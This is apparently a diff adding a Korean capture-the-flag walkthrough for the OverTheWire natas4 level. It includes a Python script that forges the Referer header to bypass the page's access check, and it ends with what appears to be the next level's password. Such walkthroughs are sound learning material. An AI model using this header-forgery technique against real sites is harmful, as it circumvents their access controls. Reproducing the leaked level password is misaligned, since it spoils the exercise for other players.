@@ -1,1 +1,29 @@
+natas4 사이트에 접속시 "Access disallowed. You are visiting from an unauthorized referral." 가 출력됨
+즉 허용되지 않은 경로에서 들어와서 접근이 거부된건.
+
+원래 들어간 경로는 natas4.natas.labs.overthewire.org 임.
+하지만 natas5.natas.labs.overthewire.org 에서 접속한걸로 속여야 접속이 가능한걸 알 수 있음.
+
+그렇기에 referer을 변경해야 함.
+
+방법 1. ModHeader
+크롬 확장 도구인 ModHeader 를 사용할 수 있지만 현재 환경에선 불가능.
+
+방법 2. Burp Suite
+Burp Suite 프로그램을 이용하여 가능하지만 현재 환경에서 불가능.
+
+방법3. python
+linux에 아래와 같은 글 작성.
+python3 -c "
+import requests    # requests 라이버러리를 가져와서 HTTP 요청을 쉽게 보낼 수 있게 함.
+from requests.auth import HTTPBasicAuth    # HTTPBasicAuth 는 HTTP 기본 인증을 쉽게 처리하기 위한 클래스임.
+
+url = 'http://natas4.natas.labs.overthewire.org/'    # 접속할 웹사이트 URL을 변수 url에 저장.
+headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}    # 서버에 보낼 HTTP 헤더중 하나인 Referer을 저장.
+auth = HTTPBasicAuth('natas4', '<natas 3 비밀번호>')    # HTTP 기본 인증용 사용자 이름과 비밀번호를 설정.
+
+r = requests.get(url, auth=auth, headers=headers)    # requests.get() 메서드를 써서 HTTP GET 요청을 보냄.
+print(r.text)    # 서버가 응답 한 HTML body 내용을 출력.
+
+
 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
